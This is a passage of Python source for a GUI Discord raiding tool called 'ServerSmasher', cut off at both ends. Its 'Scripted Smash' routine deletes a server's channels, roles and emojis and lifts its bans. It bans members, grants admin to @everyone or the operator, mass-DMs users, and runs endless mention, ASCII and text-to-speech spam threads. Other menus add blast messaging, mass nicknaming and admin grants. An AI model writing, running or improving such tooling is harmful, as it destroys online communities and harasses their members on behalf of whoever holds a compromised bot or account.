        return 'image/gif'
    elif data.startswith(b'RIFF') and data[8:12] == b'WEBP':
        return 'image/webp'

def bytes_to_base64_data(data):  # From Discord.py
    fmt = 'data:{mime};base64,{data}'
    mime = get_mime(data)
    b64 = b64encode(data).decode('ascii')
    return fmt.format(mime=mime, data=b64)

def crop_center(pil_img, crop_width, crop_height):
    img_width, img_height = pil_img.size
    return pil_img.crop(((img_width - crop_width) // 2,
                         (img_height - crop_height) // 2,
                         (img_width + crop_width) // 2,
                         (img_height + crop_height) // 2))

def mask_circle_transparent(pil_img, blur_radius, offset=0):
    offset = blur_radius * 1.3 + offset
    mask = Image.new("L", pil_img.size, 0)
    draw = ImageDraw.Draw(mask)
    draw.ellipse((offset, offset, pil_img.size[0] - offset, pil_img.size[1] - offset), fill=255)
    mask = mask.filter(ImageFilter.GaussianBlur(blur_radius))
    result = pil_img.copy()
    result.putalpha(mask)
    return result

def crop_max_square(pil_img):
    return crop_center(pil_img, min(pil_img.size), min(pil_img.size))


#  __  __      _         ___ _   _ ___
# |  \/  |__ _(_)_ _    / __| | | |_ _|
# | |\/| / _` | | ' \  | (_ | |_| || |
# |_|  |_\__,_|_|_||_|  \___|\___/|___|
def main_menu():
    global guild_cache
    global user
    global avatar_b64
    del guild_cache
    guild_cache = create_cache()
    guilds = guild_cache
    server_dict = {}
    usercount = 0
    for guild in guilds:
        usercount += len(guild.members)
        server_dict[guild.name] = guild.id
    if len(list(server_dict)) == 0:
        server_dict = {"None": "None"}
    user_frame = [
                 [sg.Button(image_data=avatar_b64, size=(3,3), pad=((0,0),0), button_color=theme['background_color'], key=f"Change {client_type} Options"), sg.Text(f"{user.username}#{user.discriminator}, ({user.id})", font='Any 11')],
                 [sg.Button("Logout"), sg.Button("Refresh")]
                 ]
    server_frame = [
                   [sg.Combo(sorted(list(server_dict)), size=(20,0.7), key="ServerID"), sg.Button("Select Server", size=(9,0.8)), sg.Button("Leave Server", size=(9,0.8)),]
                   ]
    status_frame = [
                   [sg.Combo(['Playing', 'Streaming', 'Watching', 'Listening to'], default_value=startup_activity_type, readonly=True, key="StatusType"), sg.InputText(startup_activity_name, key="StatusName"),sg.Combo(['online', 'dnd', 'idle', 'invisible'], default_value=startup_status, readonly=True, key="StatusStatus")],
                   [sg.Button("Change Status")]
                   ]
    options_frame = [
                    [sg.Button(f"Change {client_type} Options")],
                    [sg.Input("Server Name", key="NewServerName"), sg.Button("Create Server")],
                    [sg.Input(f"https://discordapp.com/api/oauth2/authorize?client_id={user.id}&permissions=8&scope=bot")]
                    ]
    layout = [
             [sg.Frame('Logged in to ServerSmasher as:', user_frame, font='Any 12', title_color=theme['text_color'])],
             [sg.Frame("Edit Status", status_frame, font='Any 12', title_color=theme['text_color'])],
             [sg.Frame(f"{client_type} is in {len(guilds)} Servers ({usercount} members total.)", server_frame, font='Any 10', title_color=theme['text_color'])],
             [sg.Frame("Other Options", options_frame, font='Any 10', title_color=theme['text_color'])]
             ]
    window = sg.Window("DeadBread's ServerSmasher v{}".format(ssversion), resizable=False, keep_on_top=True).Layout(layout)
    while True:
        event, values = window.Read()
        if event is None:
            ws.close()
            sys.exit()
        elif event == "Select Server":
            if values["ServerID"] == "None":
                pass
            else:
                window.Close()
                sg.PopupNonBlocking("Loading Server, Please Wait", keep_on_top=True, auto_close=True, auto_close_duration=1)
                server_menu(server_dict[values["ServerID"]])
        elif event == "Logout":
            window.Close()
            ws.close()
            login_serversmasher()
        elif event == "Refresh":
            sg.PopupNonBlocking("Updating Cache...", auto_close=True, auto_close_duration=1, keep_on_top=True)
            guild_cache = create_cache()
            guilds = guild_cache
            server_dict = {}
            usercount = 0
            for guild in guilds:
                usercount += len(guild.members)
                server_dict[guild.name] = guild.id
            if len(list(server_dict)) == 0:
                server_dict = {"None": "None"}
            user_frame = [
                         [sg.Button(image_data=avatar_b64, size=(3,3), pad=((0,0),0), button_color=theme['background_color'], key=f"Change {client_type} Options"), sg.Text(f"{user.username}#{user.discriminator}, ({user.id})", font='Any 11')],
                         [sg.Button("Logout"), sg.Button("Refresh")]
                         ]
            server_frame = [
                           [sg.Combo(sorted(list(server_dict)), size=(20,0.7), key="ServerID"), sg.Button("Select Server", size=(9,0.8)), sg.Button("Leave Server", size=(9,0.8)),]
                           ]
            status_frame = [
                           [sg.Combo(['Playing', 'Streaming', 'Watching', 'Listening to'], default_value=startup_activity_type, readonly=True, key="StatusType"), sg.InputText(startup_activity_name, key="StatusName"),sg.Combo(['online', 'dnd', 'idle', 'invisible'], default_value=startup_status, readonly=True, key="StatusStatus")],
                           [sg.Button("Change Status")]
                           ]
            options_frame = [
                            [sg.Button(f"Change {client_type} Options")],
                            [sg.Input("Server Name", key="NewServerName"), sg.Button("Create Server")],
                            [sg.Input(f"https://discordapp.com/api/oauth2/authorize?client_id={user.id}&permissions=8&scope=bot")]
                            ]
            layout = [
                     [sg.Frame('Logged in to ServerSmasher as:', user_frame, font='Any 12', title_color=theme['text_color'])],
                     [sg.Frame("Edit Status", status_frame, font='Any 12', title_color=theme['text_color'])],
                     [sg.Frame(f"{client_type} is in {len(guilds)} Servers ({usercount} members total.)", server_frame, font='Any 10', title_color=theme['text_color'])],
                     [sg.Frame("Other Options", options_frame, font='Any 10', title_color=theme['text_color'])]
                     ]
            window1 = sg.Window("DeadBread's ServerSmasher v{}".format(ssversion), resizable=False, keep_on_top=True).Layout(layout)
            window.Close()
            window = window1
        elif event == "Leave Server":
            e = sg.PopupYesNo(f"Are you sure you want to leave {values['ServerID']}?", keep_on_top=True)
            if e == "Yes":
                window.Close()
                leave_guild(server_dict[values["ServerID"]])
                main_menu()
            else:
                pass
        elif event == "Change Status":
            change_presence(values["StatusName"], values["StatusType"], values["StatusStatus"])
            with open('RTBFiles/ServerSmasher/ssconfig.json', 'r+') as handle:
                edit = json.load(handle)
                edit['startup_status'] = values["StatusStatus"]
                edit['startup_activity_name'] = values["StatusName"]
                edit['startup_activity_type'] = values["StatusType"]
                handle.seek(0)
                json.dump(edit, handle, indent=4)
                handle.truncate()
        elif event == "Create Server":
            window.Close()
            create_guild(values["NewServerName"])
            sg.PopupNonBlocking("Updating Cache...", auto_close=True, auto_close_duration=1, keep_on_top=True)
            main_menu()
        elif event == "Change Bot Options":
            option_frame = [
                           [sg.Input("New Avatar...", key="NewAvatarBot", size=(15,0.7)), sg.FileBrowse(file_types=(("PNG Files", "*.png"),("JPG Files", "*.jpg"),("JPEG Files", "*.jpeg"),("GIF Files", "*.gif"),("WEBM Files", "*.webm")))],
                           [sg.Input(user.username, key="NewBotName", size=(15,0.7)), sg.Text(f"#{user.discriminator}")]
                           ]
            layout = [
                     [sg.Frame("Bot Options", option_frame, font='Any 10', title_color=theme['text_color'])],
                     [sg.Button("Save Changes"), sg.Button("Back")]
                     ]
            window1 = sg.Window("DeadBread's ServerSmasher v{}".format(ssversion), resizable=False, keep_on_top=True).Layout(layout)
            window.Close()
            window = window1
        elif event == "Save Changes":
            sg.PopupNonBlocking("Saving Changes...", auto_close=True, auto_close_duration=1, keep_on_top=True)
            edit_profile(values["NewBotName"], values["NewAvatarBot"])
        elif event == "Back":
            window.Close()
            sg.PopupNonBlocking("Downloading Data From Discord, Please Wait...", auto_close=True, auto_close_duration=1, keep_on_top=True)
            main_menu()

def server_menu(server_id):
    global spamming
    server = get_guild(server_id)
    server_owner = get_user(server.owner_id)
    spamming = False
    tchannels = {}
    vchannels = {}
    tlist = []
    vlist = []
    if len(server.channels) == 0:
        tchannels = {"None":"None"}
        vchannels = {"None":"None"}
        tlist = []
        vlist = []
    for channel in server.channels:
        if channel.type == 0:
            tchannels[channel.name] = channel.id
            tlist.append(channel)
        elif channel.type == 2:
            vchannels[channel.name] = channel.id
            vlist.append(channel)
    for member in server.members:
        if member.user.id == user.id:
            server_me = member
    info = [
           [sg.Text(f"Name: {server.name}\nID: {server.id}\nText Channels: {len(tlist)}\nVoice Channels: {len(vlist)}\nRoles: {len(server.roles)}\nMembers: {len(server.members)}\nRegion: {server.region}\nNitro Boost Level: {server.premium_tier}\nVerification Level: {server.verification_level}\nOwner: {server_owner.username}#{server_owner.discriminator}")],
           [sg.Button("View Permissions")]
           ]
    oneclick = [
               [sg.Button("Refresh", size=(13.5,0.8)), sg.Button("Back to server menu", size=(13.5,0.8))],
               [sg.Input("@everyone", size=(17,0.8), key="BlastContent"), sg.Button("Blast", size=(10,0.8))],
               [sg.Input("Channel Name", size=(13.6,0.8), key="ChannelName"),sg.Input("5", size=(3,0.8), key="ChannelCount"), sg.Button("Create Channel", size=(10,0.8))],
               [sg.Text("", size=(0.05,0.8)), sg.Combo(list(tchannels), key="InviteChan", size=(16.6,0.7)), sg.Button("Create Invite", size=(10,0.8))],
               [sg.Input("Dead", size=(17,0.8), key="NewNickname"), sg.Button("Mass Nickname", size=(10,0.8))],
               [sg.Input("ID For Admin", size=(17,0.8), key="AdminID"), sg.Button("Give Admin", size=(10,0.8))]
               ]
    advanced = [
                [sg.Button("Scripted Smash")],
                [sg.Button("Server Corruptor")],
                [sg.Button("Thanos Snap")]
                ]
    mass_dm = [
              [sg.Multiline("DM Content", key="MassDmContent")],
              [sg.Button("Send DM to Everyone")]
              ]
    layout = [
             [sg.Frame("Server Info", info, font='Any 12', title_color=theme['text_color']), sg.Frame("Actions", oneclick, font='Any 12', title_color=theme['text_color'])],
             [sg.Frame("Advanced Actions", advanced, font='Any 12', title_color=theme['text_color']),sg.Frame("Mass DM (ONLY USE ON BOTS!)", mass_dm, font='Any 12', title_color=theme['text_color'])]
             ]
    window = sg.Window("DeadBread's ServerSmasher v{}".format(ssversion), resizable=False, keep_on_top=True).Layout(layout)
    while True:
        event, values = window.Read(timeout=100)
        if event is None:
            ws.close()
            sys.exit()
        elif event == "Refresh":
            sg.PopupNonBlocking("Updating cache...", auto_close=True, auto_close_duration=1, keep_on_top=True)
            window.Close()
            server_menu(server_id)
        elif event == "Back to server menu":
            window.Close()
            sg.PopupNonBlocking("Please Wait, Downloading data from Discord.", title="Loading menu", auto_close=True, auto_close_duration=1, keep_on_top=True)
            main_menu()
        elif event == "Blast":
            try:
                channels = get_guild_channels(server_id)
            except Exception as e:
                sg.PopupNonBlocking("Slow the fuck down.", keep_on_top=True)
            else:
                try:
                    for channel in channels:
                        if not channel.type == 0:
                            pass
                        else:
                            if values["BlastContent"].lower() == "ascii":
                                content = asciigen(1999)
                            else:
                                content = values["BlastContent"]
                            executor.submit(send_message, channel.id, content, False)
                except Exception as e:
                    sg.PopupNonBlocking(f"Error: {e}")
        elif event == "Create Channel":
            for x in range(int(values['ChannelCount'])):
                executor.submit(create_channel, server.id, values['ChannelName'], 0)
        elif event == "Create Invite":
            invite = create_invite(tchannels[values["InviteChan"]])
            try:
                try:
                    if invite.code == 50013:
                        sg.Popup("Could not create invite.", title="Error", non_blocking=True, keep_on_top=True)
                except:
                    pass
                else:
                    pyperclip.copy(f"https://discord.gg/{invite.code}")
                    sg.Popup(f"https://discord.gg/{invite.code} copied to clipboard.", title="Invite copied to clipboard", non_blocking=True, keep_on_top=True)
            except Exception:
                sg.Popup("Could not create invite.", title="Error", non_blocking=True, keep_on_top=True)
        elif event == "Mass Nickname":
            for member in server.members:
                executor.submit(change_nickname, server.id, member.user.id, values['NewNickname'])
        elif event == "Give Admin":
            give_admin_role(server.id, values["AdminID"])
        elif event == "Send DM to Everyone":
            for member in server.members:
                executor.submit(send_dm, member.user.id, values["MassDmContent"], False)
        elif event == "View Permissions":
            window.Close()
            perm_viewer(server, server_me)
        elif event == "Scripted Smash":
            window.Close()
            scripted_smash(server.id)

def perm_viewer(server, server_me):
    perms = {}
    myroles = ""
    for role in server.roles:
        if role.id in server_me.roles:
            myroles += (f"{role.name}\n")
        roleperms = []
        for permbit in sorted(list(bitarray_values)):
            if role.permissions & bitarray_values[permbit] != 0:
                roleperms.append(permbit)
            perms[role.name] = roleperms
    col1 = [
        [sg.Text(f"My Roles:\n{myroles}")],
        [sg.Combo(list(perms), key="Role", size=(15,0.7))]
        ]
    col2 = [
        [sg.Multiline("Select a role to view permissions", key="PermView", size=(20,6))]
    ]
    frame = [
             [sg.Column(col1), sg.Column(col2)]
    ]
    layout = [
            [sg.Frame("Permissions:", frame, font='Any 12', title_color=theme['text_color'])],
            [sg.Button("Back")]
    ]
    window = sg.Window("DeadBread's ServerSmasher v{}".format(ssversion), resizable=False, keep_on_top=True).Layout(layout)
    while True:
        event, values = window.Read(timeout=100)
        if event is None:
            ws.close()
            sys.exit()
        elif event == sg.TIMEOUT_KEY:
            text = ""
            for perm in perms[values["Role"]]:
                text += f"{perm}\n"
            window.Element('PermView').Update(text)
        elif event == "Back":
            window.Close()
            sg.PopupNonBlocking("Please Wait, Downloading data from Discord.", title="Loading menu", auto_close=True, auto_close_duration=1, keep_on_top=True)
            server_menu(server.id)

def scripted_smash(server_id):
    global spamming
    global smasheroptions
    spamming = False
    sg.PopupNonBlocking("Please Wait, Downloading data from Discord.", title="Loading menu", auto_close=True, auto_close_duration=1, keep_on_top=True)
    if not os.path.isdir("RTBFiles/ServerSmasher/presets/"):
        os.mkdir("RTBFiles/ServerSmasher/presets/")
    server = get_guild(server_id)
    server_owner = get_user(server.owner_id)
    server_bans = get_guild_bans(server.id)
    tchannels = {}
    vchannels = {}
    tlist = []
    vlist = []
    for channel in server.channels:
        if channel.type == 0:
            tchannels[channel.name] = channel.id
            tlist.append(channel)
        elif channel.type == 2:
            vchannels[channel.name] = channel.id
            vlist.append(channel)
    for member in server.members:
        if member.user.id == user.id:
            server_me = member
    general_frame = [
                [sg.Button("Save Preset"), sg.Button("Load Preset")],
                [sg.Text("Change Server Name", size=(13,0.7)), sg.Checkbox("", key="ChangeServerToggle", default=smasheroptions['change_server_name'], size=(2,0.7)), sg.Input(smasheroptions['new_server_name'], key="ChangeServerName")],
                [sg.Text("Change Server Icon", size=(13,0.7)), sg.Checkbox("", key="ChangeServerIconToggle", default=smasheroptions['change_server_icon'], size=(2,0.7)), sg.Input(smasheroptions['icon_location'], size=(10,0.7), key="ChangeIconFile"), sg.FileBrowse()],
                [sg.Text("Internet location", size=(13,0.7)), sg.Checkbox("", key="IconIsInternet", default=smasheroptions['internet_icon'], size=(2,0.7))]
    ]
    delete_frame = [
                [sg.Text("Delete Channels", size=(10,0.7)), sg.Checkbox("", key="DeleteChannelsToggle", default=smasheroptions['delete_channels'], size=(2,0.7))],
                [sg.Text("Delete Roles", size=(10,0.7)), sg.Checkbox("", key="DeleteRolesToggle", default=smasheroptions['delete_roles'], size=(2,0.7))],
                [sg.Text("Delete Emojis", size=(10,0.7)), sg.Checkbox("", key="DeleteEmojisToggle", default=smasheroptions['delete_emojis'], size=(2,0.7))],
                [sg.Text("Remove Bans", size=(10,0.7)), sg.Checkbox("", key="RemoveBansToggle", default=smasheroptions['remove_bans'], size=(2,0.7))]
    ]
    create_frame = [
                [sg.Text("Create Channels", size=(10,0.7)), sg.Checkbox("", key="CreateChannelsToggle", default=smasheroptions['create_channels'], size=(2,0.7)), sg.Combo(['ASCII', 'Set', 'Random', 'VC'], default_value=smasheroptions['channel_create_method'], key="ChanCreateMethod"), sg.Spin([i for i in range(1,501)], initial_value=smasheroptions['channel_count'], key="ChanCreateCount"), sg.Input(smasheroptions['channel_name'], key="ChanCreateName")],
                [sg.Text("Create Roles", size=(10,0.7)), sg.Checkbox("", key="CreateRolesToggle", default=smasheroptions['create_roles'], size=(2,0.7)), sg.Combo(['ASCII', 'Set', 'Random'], default_value=smasheroptions['role_create_method'], key="RoleCreateMethod"), sg.Spin([i for i in range(1,251)], initial_value=smasheroptions['role_count'], key="RoleCreateCount"), sg.Input(smasheroptions['role_name'], key="RoleCreateName")],
                [sg.Text("Create Emojis", size=(10,0.7)), sg.Checkbox("", key="CreateEmojisToggle", default=smasheroptions['delete_emojis'], size=(1.7,0.7)),  sg.Spin([i for i in range(1,51)], initial_value=smasheroptions['emoji_count'], key="EmojiCreateCount", size=(5,0.7)), sg.Text("Internet Location", size=(10,0.7)),sg.Checkbox("", key="EmojiIsInternet", default=smasheroptions['internet_emoji'], size=(2,0.7))],
                [sg.Text("Emoji Path", size=(10,0.7)), sg.Input(smasheroptions['emoji_location'], key="EmojiCreatePath"), sg.FileBrowse()]
    ]
    user_frame = [
                [sg.Text("Give @eveyone admin", size=(13,0.7)), sg.Checkbox("", key="everyoneAdminToggle", default=smasheroptions['give_@everyone_admin'], size=(2,0.7))],
                [sg.Text("Ban all members", size=(13,0.7)), sg.Checkbox("", key="BanMembersToggle", default=smasheroptions['ban_members'], size=(2,0.7))],
                [sg.Text("Ban Reason", size=(13,0.7)), sg.Input(smasheroptions['ban_reason'], key="BanReason")],
                [sg.Text("Member IDs to not ban (Separated by a newline)", size=(28,0.7))],
                [sg.Multiline(smasheroptions['ban_whitelist'], key="BanWhitelist", size=(27,2.9))]
    ]
    other_frame = [
                [sg.Text("Give Me Admin", size=(9,0.7)), sg.Checkbox("", key="MeAdminToggle", default=smasheroptions['give_me_admin'], size=(2,0.7)), sg.Input(smasheroptions['my_id'], key="MyIDAdmin", size=(15,0.7))],
                [sg.Text("Mass DM", size=(9,0.7)), sg.Checkbox("", key="MassDMToggle", default=smasheroptions['send_mass_dm'], size=(2,0.7)), sg.Input(smasheroptions['dm_content'], key="MassDMContent", size=(15,0.7))],
                [sg.Text("Spam Server", size=(9,0.7)), sg.Checkbox("", key="SpamToggle", default=smasheroptions['flood_channels'], size=(2,0.7)), sg.Input(smasheroptions['flood_text'], key="SpamText", size=(15,0.7))],
                [sg.Text("Spam Method", size=(9,0.7)), sg.Combo(['ASCII','@everyone','Custom','Mass Mention'], default_value=smasheroptions['flood_method'], size=(10,0.6), key="SpamMethod"), sg.Text("Use TTS"), sg.Checkbox("", key="UseTTS", default=smasheroptions['use_tts'], size=(2,0.7))],
    ]
    button_frame = [
                [sg.Button("Start"), sg.Button("Info"), sg.Button("Back")]
    ]
    output_frame = [
                [sg.Output()],
                [sg.Frame("", button_frame)]
    ]
    layout = [
            [sg.Frame("General Options", general_frame, font='Any 12', title_color=theme['text_color']), sg.Frame("Deletion options", delete_frame, font='Any 12', title_color=theme['text_color']), sg.Frame("Creation options", create_frame, font='Any 12', title_color=theme['text_color'])],
            [sg.Frame("Member Options", user_frame, font='Any 12', title_color=theme['text_color'], size=(30,10)), sg.Frame("Other Options", other_frame, font='Any 12', title_color=theme['text_color']), sg.Frame("Output", output_frame, font='Any 12', title_color=theme['text_color'])]
    ]
    window = sg.Window(f"DeadBread's ServerSmasher v{ssversion} | Scripted Smash on: {server.name}, {len(server.members)} members", resizable=False, keep_on_top=True).Layout(layout)
    while True:
        try:
            event, values = window.Read(timeout=10)
        except:
            continue
        if event is None:
            ws.close()
            sys.exit()
        elif event == sg.TIMEOUT_KEY:
            window.Refresh()
            if values["ChanCreateMethod"] == "Set":
                window.Element("ChanCreateName").Update(disabled=False)
            elif values["ChanCreateMethod"] == "VC":
                window.Element("ChanCreateName").Update(disabled=False)
            else:
                window.Element("ChanCreateName").Update(disabled=True)
            if values["RoleCreateMethod"] == "Set":
                window.Element("RoleCreateName").Update(disabled=False)
            else:
                window.Element("RoleCreateName").Update(disabled=True)
            if values["SpamMethod"] == "Custom":
                window.Element("SpamText").Update(disabled=False)
            else:
                window.Element("SpamText").Update(disabled=True)
            smasheroptions['change_server_name'] = values["ChangeServerToggle"]
            smasheroptions['new_server_name'] = values["ChangeServerName"]
            smasheroptions['change_server_icon'] = values["ChangeServerIconToggle"]
            smasheroptions['internet_icon'] = values["IconIsInternet"]
            smasheroptions['icon_location'] = values["ChangeIconFile"]
            smasheroptions['remove_bans'] = values["RemoveBansToggle"]
            smasheroptions['delete_channels'] = values["DeleteChannelsToggle"]
            smasheroptions['delete_roles'] = values["DeleteRolesToggle"]
            smasheroptions['delete_emojis'] = values["DeleteEmojisToggle"]
            smasheroptions['create_channels'] = values["CreateChannelsToggle"]
            smasheroptions['channel_create_method'] = values["ChanCreateMethod"]
            smasheroptions['channel_name'] = values["ChanCreateName"]
            smasheroptions['channel_count'] = int(values["ChanCreateCount"])
            smasheroptions['create_roles'] = values["CreateRolesToggle"]
            smasheroptions['role_count'] = int(values["RoleCreateCount"])
            smasheroptions['role_create_method'] = values["RoleCreateMethod"]
            smasheroptions['role_name'] = values["RoleCreateName"]
            smasheroptions['create_emojis'] = values["CreateEmojisToggle"]
            smasheroptions['internet_emoji'] = values["EmojiIsInternet"]
            smasheroptions['emoji_location'] = values["EmojiCreatePath"]
            smasheroptions['emoji_count'] = int(values["EmojiCreateCount"])
            smasheroptions['give_@everyone_admin'] = values["everyoneAdminToggle"]
            smasheroptions['ban_members'] = values["BanMembersToggle"]
            smasheroptions['ban_reason'] = values["BanReason"]
            smasheroptions['ban_whitelist'] = values["BanWhitelist"]
            smasheroptions['give_me_admin'] = values["MeAdminToggle"]
            smasheroptions['my_id'] = values["MyIDAdmin"]
            smasheroptions['send_mass_dm'] = values["MassDMToggle"]
            smasheroptions['dm_content'] = values["MassDMContent"]
            smasheroptions['flood_channels'] = values["SpamToggle"]
            smasheroptions['flood_method'] = values["SpamMethod"]
            smasheroptions['use_tts'] = values["UseTTS"]
            smasheroptions['flood_text'] = values["SpamText"]
        elif event == "Info":
            sg.PopupNonBlocking(f"Name: {server.name}\nID: {server.id}\nText Channels: {len(tlist)}\nVoice Channels: {len(vlist)}\nRoles: {len(server.roles)}\nMembers: {len(server.members)}\nRegion: {server.region}\nNitro Boost Level: {server.premium_tier}\nVerification Level: {server.verification_level}\nOwner: {server_owner.username}#{server_owner.discriminator}", keep_on_top=True, title="Info")
        elif event == "Back":
            window.Close()
            sg.PopupNonBlocking("Please Wait, Downloading data from Discord.", title="Loading menu", auto_close=True, auto_close_duration=1, keep_on_top=True)
            server_menu(server.id)
        elif event == "Save Preset":
            save = sg.PopupGetText("Preset Name:", title="Save Preset", keep_on_top=True)
            if save == "Cancel":
                pass
            else:
                with open (f"RTBFiles/ServerSmasher/presets/{save}.sspreset", "w+", errors='ignore') as handle:
                    handle.write(str(smasheroptions))
        elif event == "Load Preset":
            load = sg.PopupGetFile("Select a preset:", title="Load Preset", file_types=(("ServerSmasher Preset","*.sspreset"), ("All Files", "*")), keep_on_top=True)
            if load == "Cancel":
                pass
            else:
                with open(load, "r", errors="ignore") as handle:
                    smasheroptions = ast.literal_eval(handle.read())
                window.Close()
                sg.PopupNonBlocking("Please Wait, Downloading data from Discord.", title="Loading menu", auto_close=True, auto_close_duration=1, keep_on_top=True)
                scripted_smash(server.id)
        elif event == "Start":
            window.Refresh()
            roleperms = []
            for role in server.roles:
                if role.id in server_me.roles:
                    for permbit in sorted(list(bitarray_values)):
                        if role.permissions & bitarray_values[permbit] != 0:
                            roleperms.append(permbit)
            if not "ADMINISTRATOR" in roleperms:
                con = sg.PopupYesNo("You do not have admin permissions on this server.\nContinue anyway?", keep_on_top=True, title="Warning")
                if con == "Yes":
                    pass
                else:
                    window.Close()
                    sg.PopupNonBlocking("Please Wait, Downloading data from Discord.", title="Loading menu", auto_close=True, auto_close_duration=1, keep_on_top=True)
                    scripted_smash(server.id)
            no_ban = smasheroptions['ban_whitelist'].splitlines()

            if smasheroptions['create_emojis']:
                if smasheroptions['internet_emoji']:
                    print("Downloading Emoji...")
                    src = requests.get(smasheroptions['emoji_location'])
                    encoded_emoji = bytes_to_base64_data(src.content)
                else:
                    with open(smasheroptions['emoji_location'], "rb") as handle:
                        encoded_emoji = bytes_to_base64_data(handle.read())

            if smasheroptions['change_server_icon']:
                if smasheroptions['internet_icon']:
                    print("Downloading Server icon...")
                    window.Refresh()
                    src = requests.get(smasheroptions['icon_location'])
                    encoded_server_icon = bytes_to_base64_data(src.content)
                else:
                    with open(smasheroptions['emoji_location'], "rb") as handle:
                        encoded_server_icon = bytes_to_base64_data(handle.read())

            if smasheroptions['delete_channels']:
                print('Deleting channels...')
                window.Refresh()
                with ThreadPoolExecutor(max_workers=thread_count) as exec:
                    for channel in server.channels:
                        print (f"Deleting {channel.name}")
                        window.Refresh()
                        exec.submit(delete_channel, channel.id)
                print('Finished deleting channels.')
                window.Refresh()

            if smasheroptions['delete_roles']:
                print('Deleting Roles...')
                window.Refresh()
                with ThreadPoolExecutor(max_workers=thread_count) as exec:
                    for role in server.roles:
                        print (f"Deleting role: {role.name}")
                        window.Refresh()
                        exec.submit(delete_role, role.id, server.id)
                print('Finished deleting roles.')
                window.Refresh()

            if smasheroptions['remove_bans']:
                print('Removing bans...')
                window.Refresh()
                with ThreadPoolExecutor(max_workers=thread_count) as exec:
                    for ban in server_bans:
                        print(f"Removing ban for: {ban.user.username}")
                        window.Refresh()
                        exec.submit(remove_ban, server.id, ban.user.id)
                print("Finished Removing Bans")
                window.Refresh()

            if smasheroptions['delete_emojis']:
                print("Deleting Emojis...")
                window.Refresh()
                with ThreadPoolExecutor(max_workers=thread_count) as exec:
                    for emoji in server.emojis:
                        print(f"Deleting {emoji.name}")
                        window.Refresh()
                        exec.submit(delete_emoji, server.id, emoji.id)
                print("Finished deleting emojis.")
                window.Refresh()

            if smasheroptions['send_mass_dm']:
                print("Sending DMs...")
                window.Refresh()
                with ThreadPoolExecutor(max_workers=thread_count) as exec:
                    for member in server.members:
                        print (f"Sending DM to {member.user.username}")
                        window.Refresh()
                        exec.submit(send_dm, member.user.id, smasheroptions['dm_content'], smasheroptions['use_tts'])
                print("Finished Sending DMs.")
                window.Refresh()

            if smasheroptions['change_server_name']:
                print('Changing server name...')
                window.Refresh()
                edit_guild_name(server.id, smasheroptions['new_server_name'])

            if smasheroptions['change_server_icon']:
                print('Changing icon...')
                window.Refresh()
                edit_guild_icon(server.id, encoded_server_icon)

            if smasheroptions['give_@everyone_admin']:
                print('Giving everyone admin...')
                window.Refresh()
                for role in server.roles:
                    if role.name == '@everyone':
                        edit_role(role.id, server.id, 8)

            if smasheroptions['ban_members']:
                print('Banning users...')
                window.Refresh()
                with ThreadPoolExecutor(max_workers=thread_count) as exec:
                    for member in server.members:
                        if member.user.id in no_ban:
                            print(f"Not Banning {member.user.username}")
                        else:
                            print (f"Banning {member.user.username}")
                            exec.submit(ban_user, member.user.id, server.id, smasheroptions['ban_reason'])
                        window.Refresh()
                print("Finished Banning Members.")
                window.Refresh()

            if smasheroptions['give_me_admin']:
                print('Giving you admin...')
                window.Refresh()
                give_admin_role(server.id, smasheroptions['my_id'])

            if smasheroptions['create_channels']:
                print('Creating channels...')
                window.Refresh()
                with ThreadPoolExecutor(max_workers=thread_count) as exec:
                    for x in range(int(smasheroptions['channel_count'])):
                        if smasheroptions['channel_create_method'] == "ASCII":
                            exec.submit(create_channel, server.id, asciigen(60), "text")
                        elif smasheroptions['channel_create_method'] == "Set":
                            exec.submit(create_channel, server.id, smasheroptions['channel_name'], "text")
                        elif smasheroptions['channel_create_method'] == "Random":
                            exec.submit(create_channel, server.id, gen(size=60), "text")
                        elif smasheroptions['channel_create_method'] == "VC":
                            exec.submit(create_channel,server.id, smasheroptions['channel_name'], "voice")
                print ('Finished Creating Channels.')
                window.Refresh()

            if smasheroptions['create_roles']:
                print('Creating roles...')
                window.Refresh()
                with ThreadPoolExecutor(max_workers=thread_count) as exec:
                    for x in range(int(2)): # smasheroptions['role_count']
                        if smasheroptions['role_create_method'] == "Set":
                            exec.submit(create_role, smasheroptions['role_name'], server.id)
                        elif smasheroptions['role_create_method'] == "ASCII":
                            exec.submit(create_role, asciigen(60), server.id)
                        elif smasheroptions['role_create_method'] == "Random":
                            exec.submit(create_role, gen(size=60), server.id)
                print ('Finished Creating Roles.')
                window.Refresh()

            if smasheroptions['create_emojis']:
                print("Creating Emojis")
                window.Refresh()
                with ThreadPoolExecutor(max_workers=thread_count) as exec:
                    for x in range(int(smasheroptions['emoji_count'])):
                        exec.submit(create_emoji, server.id, encoded_emoji, gen())
                print("Created Emojis.")
                window.Refresh()

            print("Finished!")
            window.Refresh()
            server = get_guild(server_id)
            server_bans = get_guild_bans(server.id)

            if smasheroptions['flood_channels']:
                spamming = True
                print('Spam will start in 5 seconds.')
                window.Refresh()
                if smasheroptions['flood_method'] == 'ASCII':
                    spam = threading.Thread(target=ascii_spam, args=[server, smasheroptions['use_tts']], daemon=True)
                elif smasheroptions['flood_method'] == 'Mass Mention':
                    spam = threading.Thread(target=mass_tag, args=[server, smasheroptions['use_tts']], daemon=True)
                elif smasheroptions['flood_method'] == 'Custom':
                    spam = threading.Thread(target=text_spam, args=[ server, smasheroptions['flood_text'], smasheroptions['use_tts']], daemon=True)
                elif smasheroptions['flood_method'] == '@everyone':
                    spam = threading.Thread(target=everyone_spam, args=[server, smasheroptions['use_tts']], daemon=True)
                spam.start()

def mass_tag(server, use_tts):
    global spamming
    time.sleep(5)
    msg = ''
    for member in server.members:
        msg += f"<@{member.user.id}> "
    with ThreadPoolExecutor(max_workers=len(server.channels)) as exec:
        while spamming:
            for channel in server.channels:
                if not channel.type == 0:
                    continue
                else:
                    for m in [msg[i:i+1999] for i in range(0, len(msg), 1999)]:
                        exec.submit(send_message, channel.id, m, use_tts)
            time.sleep(5)

def ascii_spam(server, use_tts): # "oh god you scrambled that server"
    global spamming
    time.sleep(5)
    print("Started Spamming")
    with ThreadPoolExecutor(max_workers=len(server.channels)) as exec:
        while spamming:
            for channel in server.channels:
                if not channel.type == 0:
                    continue
                else:
                    exec.submit(send_message, channel.id, asciigen(1999), use_tts)
            time.sleep(5)

def text_spam(server, text, use_tts):
    global spamming
    time.sleep(5)
    print("Started Spamming")
    with ThreadPoolExecutor(max_workers=len(server.channels)) as exec:
        while spamming:
            for channel in server.channels:
                if not channel.type == 0:
                    continue
                else:
                    exec.submit(send_message, channel.id, text, use_tts)
            time.sleep(5)

def everyone_spam(server, use_tts):
    global spamming
    time.sleep(5)
